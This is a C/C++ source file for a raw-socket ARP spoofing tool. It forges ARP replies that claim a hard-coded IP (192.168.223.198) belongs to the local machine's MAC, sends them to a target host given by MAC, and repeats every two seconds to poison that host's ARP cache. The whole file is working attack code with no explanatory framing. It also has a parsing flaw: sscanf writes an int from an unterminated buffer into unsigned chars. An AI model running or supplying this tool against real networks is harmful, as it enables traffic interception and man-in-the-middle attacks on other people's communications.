#include<sys/types.h>
#include<sys/socket.h>
#include<linux/if.h>
#include<linux/if_packet.h>
#include<linux/if_ether.h>
#include<netinet/in.h>
#include<netinet/if_ether.h>
#include<net/ethernet.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<stdio.h>
#include<string.h>
#include<cerrno>
#include<unistd.h>

int creatSockfd() {
	int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if(sockfd == -1) {
		printf("socket create error \n");
		printf("%s", strerror(errno));
		_exit(0);
	}
	return sockfd;
}

ifreq initIfreq(int sockfd) {
	ifreq ifr;
	strcpy(ifr.ifr_name, "eth0");
	if(ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1){
		printf("error ioctl SIOCGIFINDEX!\n");
		printf("%s", strerror(errno));
		_exit(0);
	}
	return ifr;
}

sockaddr_ll initAddr_ll(ifreq * ifr, int sockfd) {
	sockaddr_ll addr_ll;
	memset(&addr_ll, 0, sizeof(sockaddr_ll));
	addr_ll.sll_family = PF_PACKET;
	addr_ll.sll_ifindex = ifr->ifr_ifindex;

	if(ioctl(sockfd, SIOCGIFADDR, ifr) == -1) {
		printf("error ioctl SIOCGIFADDR \n");
		printf("%s", strerror(errno));
		_exit(0);
	}
	if(ioctl(sockfd, SIOCGIFHWADDR, ifr) == -1) {
		printf("error ioctl SIOCGIFHWADDR \n");
		printf("%s", strerror(errno));
		_exit(0);
	}
	return addr_ll;
}

void convert_str_to_unchar(char * str, unsigned char * unchar){
	int i = strlen(str), counter = 0;
	char c[2];
	unsigned char bytes[2];
	for(int j = 0; j < i; j += 2) {
		if(j % 2 == 0) {
			c[0] = str[j];
			c[1] = str[j + 1];
			//sscanf(c, "%02x", &bytes[0]);
			//unchar[counter] = bytes[0];
			sscanf(c, "%02x", &unchar[counter]);
			counter++;
		}
	}
}

ether_header init_ether_header(ifreq ifr, char * strDst) {
	ether_header header;

	unsigned char macSrc[ETH_ALEN];
	memcpy(macSrc, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	printf("local MAC address");
	for(int i = 0; i < ETH_ALEN; i++){
		printf(":%02x", macSrc[i]);
	}
	printf("\n");

	unsigned char macDst[ETH_ALEN];
	convert_str_to_unchar(strDst, macDst);

	memcpy(header.ether_dhost, macDst, ETH_ALEN);
	memcpy(header.ether_shost, macSrc, ETH_ALEN);
	header.ether_type = htons(ETHERTYPE_ARP);
	return header;
}

ether_arp init_arp(ether_header header) {
	ether_arp arp;
	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETH_ALEN;
	arp.arp_pln = 4;
	arp.arp_op = htons(ARPOP_REPLY);
	//arp.arp_op = htons(ARPOP_REQUEST);
	in_addr src_in_addr, dst_in_addr;
	inet_pton(AF_INET, "192.168.223.198", &src_in_addr);
	inet_pton(AF_INET, "192.168.223.221", &dst_in_addr);
	
	memcpy(arp.arp_sha, header.ether_shost, ETH_ALEN);
	memcpy(arp.arp_spa, &src_in_addr, 4);
	memcpy(arp.arp_tha, header.ether_dhost, ETH_ALEN);
	memcpy(arp.arp_tpa, &dst_in_addr, 4);

	return arp;
}

int main(int argc, char * argv[]) {
	int sockfd = creatSockfd();

	printf("%d\n", sockfd);

	ifreq ifr = initIfreq(sockfd);
	//ifreq ifr; 

	//strcpy(ifr.ifr_name, "eth0");
	//if(ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1){
	//	printf("error ioctl SIOCGIFINDEX!\n");
	//	printf("%s", strerror(errno));
	//	_exit(0);
	//}

	sockaddr_ll addr_ll = initAddr_ll(&ifr, sockfd);

	char * ipSrc = inet_ntoa(((struct sockaddr_in *)(&(ifr.ifr_addr)))->sin_addr);
	printf("ip address : %s\n", ipSrc); //source ip

	//sockaddr_ll addr_ll = initAddr_ll(&ifr, sockfd);

	ether_header header = init_ether_header(ifr, argv[1]);

	ether_arp arp = init_arp(header);

	unsigned char sendBuf[sizeof(ether_header) + sizeof(ether_arp)];
	memcpy(sendBuf, &header, sizeof(ether_header));
	memcpy(sendBuf + sizeof(ether_header), &arp, sizeof(ether_arp));
	while(1) {
		int len = sendto(sockfd, sendBuf, sizeof(sendBuf), 0, (const sockaddr *) &addr_ll, sizeof(addr_ll));
		if(len > 0)
			printf("send success~\n");
		sleep(2);	
	}
	//int len = sendto(sockfd, sendBuf, sizeof(sendBuf), 0, (const sockaddr *) &addr_ll, sizeof(addr_ll));
	//if (len > 0) {
	//	printf("send success\n");
	//}
	
	return 0;
}
